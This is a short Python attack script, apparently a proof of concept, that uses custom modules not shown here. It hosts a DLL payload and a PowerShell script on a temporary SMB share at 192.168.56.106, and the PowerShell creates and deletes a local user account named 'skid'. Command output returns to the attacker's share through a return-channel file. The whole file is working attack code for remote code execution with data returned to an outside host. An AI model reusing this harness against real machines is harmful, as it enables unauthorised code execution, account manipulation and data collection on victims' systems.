from payload import CRunPowershell
from tempsmbserver import TempSMB

local_ip = "192.168.56.106"


with TempSMB(local_ip=local_ip) as smb:
    powershell_payload = "net user skid IHaveNotReadTheCode /add; net user skid /delete;"
    return_channel = smb.future_file(ext=".out")
    powershell_file = smb.create_temp_file(f"{powershell_payload} > {return_channel.remote_path}", ext=".ps1")
    dll_payload = CRunPowershell(smb, [powershell_file])
    print(dll_payload.file.remote_path.replace("/", "\\"))
    return_channel.await_me()
    return_channel.print(cringe_utf_16=True)
